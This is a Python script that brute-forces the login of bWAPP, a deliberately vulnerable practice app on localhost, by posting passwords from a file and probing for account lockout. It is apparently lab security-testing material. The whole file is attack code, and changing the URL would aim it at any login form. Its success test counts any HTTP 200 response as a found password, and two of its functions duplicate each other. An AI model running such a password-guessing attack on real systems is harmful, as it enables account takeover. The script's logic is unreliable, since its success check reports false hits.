import requests
import concurrent.futures
import time

# Function to load passwords from a file
def load_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

# Function to check for common weak passwords
def check_common_passwords(url, username, passwords):
    results = []
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Weak password found: {password}")
            break
    return results

# Brute force attack simulation
def brute_force_attack(url, username, password_list):
    results = []
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Password found: {password}")
            break
    return results

# Checking for account lockout mechanism
def check_account_lockout(url, username):
    results = []
    for i in range(10):
        response = requests.post(url, data={'username': username, 'password': 'wrongpassword'})
        if response.status_code == 429:  # Too Many Requests
            results.append("Account lockout mechanism detected.")
            break
    if not results:
        results.append("No account lockout mechanism detected.")
    return results

# Timeout wrapper function
def execute_with_timeout(func, *args, timeout=15):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(func, *args)
        try:
            return future.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            return ["Function execution exceeded timeout."]

# Combine functions and execute
def main():
    target_url = "http://localhost/bWAPP/ba_weak_pwd.php"
    username = 'bee'
    password_file = 'common-password.txt'
    
    # Load passwords from file
    passwords = load_passwords(password_file)
    
    # Check for common weak passwords with timeout
    common_password_results = execute_with_timeout(check_common_passwords, target_url, username, passwords)
    
    # Simulate brute force attack with timeout
    brute_force_results = execute_with_timeout(brute_force_attack, target_url, username, passwords)
    
    # Check for account lockout mechanism with timeout
    account_lockout_results = execute_with_timeout(check_account_lockout, target_url, username)
    
    # Print all results separately
    print("Common Password Check Results:")
    for result in common_password_results:
        print(result)
    
    print("\nBrute Force Attack Results:")
    for result in brute_force_results:
        print(result)
    
    print("\nAccount Lockout Check Results:")
    for result in account_lockout_results:
        print(result)
        
if __name__ == "__main__":
    main()
